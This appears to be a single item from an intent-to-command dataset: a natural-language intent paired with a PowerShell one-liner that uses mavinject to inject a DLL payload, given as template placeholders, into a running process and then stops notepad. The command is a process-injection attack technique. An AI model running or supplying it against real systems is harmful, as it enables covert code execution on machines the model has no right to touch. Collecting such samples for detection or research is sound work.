# Natural language intent:
# Inject DLL payload into a running process using mavinject and then stop the notepad process.

$mypid = ${process_id} ; mavinject $mypid /INJECTRUNNING ${dll_payload} ; Stop-Process -processname notepad
